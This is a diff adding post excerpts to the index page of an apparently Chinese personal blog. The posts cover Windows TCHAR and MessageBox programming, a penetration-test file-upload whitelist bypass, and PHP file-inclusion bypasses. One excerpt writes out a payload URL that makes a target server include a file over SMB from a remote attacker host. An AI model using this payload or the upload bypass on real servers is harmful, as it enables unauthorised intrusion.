@@ -194,6 +194,263 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/" target="_self">
+          windows编程字符串处理
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/" target="_self">
+          
+          
+            
+          
+          
+
+
+
+
+
+
+tchar 是14的原因是 因为他是由环境决定   当前环境 默认是Unicode的 WCHAR 型   所以  和WCHAR 型的大小一样  如果 改变环境   tchar的大小也会跟着改变
+
+
+
+改变之后  tchar的大小就变为7了
+
+
+
+然后MessageBox函数如果用tchar类型 就不用管环境是什么了  因为tchar自动根据环境来变化
+
+
+12345678910111
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-23 22:50" pubdate>
+              2021-08-23
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Windows/">Windows</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Windows/">Windows</a>
+            
+              <a href="/tags/C/">C++</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/" target="_self">
+          文件上传绕过思路拓展
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/" target="_self">
+          
+          
+            
+          
+          案例一一次项目渗透时，通过往png后缀随便加个字符可知该上传点为白名单上传，正常情况下无法绕过
+
+通过观察接口信息，发现接口名字为UploadImg，猜测该接口用于图片上传，按照开发的习惯，保不准会存在temp、test，这类的接口，随后通过fuzz找到存在的上传接口（file），但此时的接口（file）上传文件仍旧存在限制，需要绕过。
+
+由于黑名单限制不够严谨，经过多个伪后缀尝试，发现.cer后
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-23 22:34" pubdate>
+              2021-08-23
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web/">web</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/" target="_self">
+          从控制台到窗口程序
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/" target="_self">
+          
+          
+            
+          
+          从控制台到窗口程序
+
+
+
+
+
+如果不知道函数什么意思 直接选中函数 然后按F1  可以直接打开文档
+
+
+
+
+直接按F1  查看参数配置
+
+
+MessageBox  消息框函数：
+
+
+显示一个模式对话框，其中包含一个系统图标、一组按钮和一条特定于应用程序的简短消息，例如状态或错误信息。
+
+
+消息框返回一个整数值，指示用户单击了哪个按钮。
+
+语法：
+123456int MessageBox(  HWN
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-21 20:05" pubdate>
+              2021-08-21
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Windows/">Windows</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Windows/">Windows</a>
+            
+              <a href="/tags/C/">C++</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" target="_self">
+          php文件包含漏洞（allow_url_include=Off）的绕过方法
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" target="_self">
+          
+          
+            
+          
+          分享几个当allow_url_include = Off时的文件包含漏洞的绕过方法。
+
+假设服务端的php代码（aaa.php）如下图所示：
+第1种：smb协议Payload：http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm
+
+这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器.
+首先在VPS上搭建Samb
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-21 12:44" pubdate>
+              2021-08-21
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/PHP/">PHP</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web/">web</a>
+            
+              <a href="/tags/PHP/">PHP</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_self">
           信息收集
         </a>
